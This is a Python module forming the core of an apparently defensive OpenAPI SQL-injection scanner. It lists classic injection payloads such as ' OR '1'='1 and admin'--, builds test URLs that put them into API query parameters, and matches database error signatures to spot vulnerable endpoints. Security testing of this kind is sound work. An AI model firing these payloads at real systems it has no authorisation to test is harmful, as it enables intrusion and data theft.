"""
Pure core for the OpenAPI SQLi probe (SQLiByAPISpec).

No tkinter, no network: payload list, URL building, path extraction, and — most
importantly — SQL-error detection based on real DBMS error signatures rather than
the original naive `"error" in body` check (which flagged almost everything).
"""
from __future__ import annotations

import re
from urllib.parse import quote

DEFAULT_PAYLOADS = [
    "' OR '1'='1",
    '" OR "1"="1',
    "admin'--",
    'admin"--',
    "1' AND '1'='2",
    "') OR ('1'='1",
]

# Signatures emitted by common databases when a query breaks — a far more
# reliable SQLi indicator than the substring "error".
SQL_ERROR_SIGNATURES = [
    r"you have an error in your sql syntax",
    r"warning:\s*mysqli?",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"syntax error at or near",
    r"sqlite3?::",
    r"sqlstate\[",
    r"ora-\d{5}",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"unterminated quoted string",
]
_SIG_RE = re.compile("|".join(SQL_ERROR_SIGNATURES), re.IGNORECASE)


def extract_paths(spec: dict) -> list:
    """Return the path strings from an OpenAPI/Swagger spec."""
    return list((spec.get("paths") or {}).keys())


def build_test_url(base_url: str, path: str, param: str, payload: str) -> str:
    base = base_url.rstrip("/")
    p = path if path.startswith("/") else "/" + path
    return f"{base}{p}?{param}={quote(payload, safe='')}"


def looks_like_sql_error(body: str) -> bool:
    """True if the response body contains a known SQL error signature."""
    return bool(_SIG_RE.search(body or ""))


def total_requests(num_paths: int, num_payloads: int) -> int:
    return num_paths * num_payloads
